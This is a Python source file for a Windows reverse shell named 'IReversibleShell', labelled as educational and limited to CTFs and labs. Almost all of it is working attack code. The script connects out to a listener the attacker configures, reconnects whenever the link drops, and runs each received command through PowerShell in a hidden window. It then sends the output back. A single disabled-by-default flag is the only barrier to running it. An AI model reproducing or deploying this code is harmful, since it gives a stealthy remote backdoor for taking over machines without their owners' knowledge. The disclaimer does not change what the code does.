"""
IReversibleShell - Educational Reverse Shell in Python (Windows)

⚠️ WARNING:
This script is provided for EDUCATIONAL PURPOSES ONLY.
It must only be used in legal environments such as CTFs, test labs, or systems you explicitly own.

Author: sferrad
"""

import socket
import subprocess
import os
import time

# === CONFIGURATION ===
TARGET_HOST = "127.0.0.1"  # Replace with your listener IP (attacker machine)
TARGET_PORT = 4444         # Replace with your listener port
ENABLED = False            # Set to True to enable execution (disabled by default for safety)

# === DO NOT MODIFY BELOW UNLESS YOU UNDERSTAND WHAT YOU'RE DOING ===

# Initialize client socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Try to connect once per second until success
def initial_connect():
    global client
    while True:
        try:
            client.connect((TARGET_HOST, TARGET_PORT))
            print("[+] Connected to server.")
            break
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 1 second...")
            time.sleep(1)
            client.close()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def reconnect():
    """Attempt to reconnect to the server"""
    global client
    print("[*] Attempting reconnection...")
    while True:
        try:
            client.close()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((TARGET_HOST, TARGET_PORT))
            print("[+] Reconnected successfully.")
            return True
        except Exception as e:
            print(f"[-] Reconnection failed: {e}. Retrying in 2 seconds...")
            time.sleep(2)

def main():
    if not ENABLED:
        print("⚠️ Execution is disabled. To run this script, set ENABLED = True in the configuration.")
        return

    initial_connect()
    current_dir = os.getcwd()

    try:
        while True:
            try:
                response = client.recv(4096)
                if not response:
                    print("[-] Server closed the connection.")
                    if reconnect():
                        continue
                    else:
                        break

                command = response.decode().strip()

                if command.lower() == "exit":
                    print("[*] Server requested shutdown.")
                    break

                # Handle 'cd' command manually
                if command.startswith("cd"):
                    try:
                        path = command[3:].strip() or os.path.expanduser("~")
                        new_dir = os.path.abspath(os.path.join(current_dir, path))
                        os.chdir(new_dir)
                        current_dir = new_dir
                        output = f"[+] Changed directory to: {current_dir}\n"
                    except Exception as e:
                        output = f"[!] cd error: {str(e)}\n"
                else:
                    # Hide PowerShell window (Windows only)
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                    cmd = subprocess.run(
                        ["powershell.exe", "-Command", command],
                        capture_output=True,
                        text=True,
                        cwd=current_dir,
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    output = cmd.stdout if cmd.stdout else cmd.stderr
                    if not output:
                        output = "[*] Command executed with no output.\n"

                try:
                    client.send(output.encode())
                except (ConnectionResetError, BrokenPipeError):
                    print("[-] Connection lost while sending.")
                    if reconnect():
                        client.send(output.encode())
                    else:
                        break

            except (ConnectionResetError, BrokenPipeError) as e:
                print(f"[-] Connection error: {e}")
                if reconnect():
                    continue
                else:
                    break

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user (Ctrl+C)")

    finally:
        client.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    main()
